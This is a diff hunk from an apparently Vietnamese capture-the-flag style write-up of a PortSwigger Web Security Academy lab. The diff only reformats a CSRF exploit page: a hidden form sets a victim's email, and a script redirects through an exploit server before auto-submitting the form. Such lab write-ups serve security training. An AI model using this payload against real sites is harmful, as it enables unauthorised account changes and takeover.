@@ -129,7 +129,11 @@ Như vậy, ta vào exploit server và cấu hình đoạn code sau:
 <input type="hidden" name="email" value="hello@gmail.com">
 </form>
 <script>
-if(document.location.search==''){document.location="https://exploit-0ac8005903fbd08ac2770c95014d0097.exploit-server.net/exploit?query=0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net"}else{form.submit();}
+if(document.location.search==''){
+  document.location="https://exploit-0ac8005903fbd08ac2770c95014d0097.exploit-server.net/exploit?query=0a7d0068037fd0c0c2b20d6200f60041.web-security-academy.net"
+}else{
+  form.submit();
+}
 </script>
 ```
 
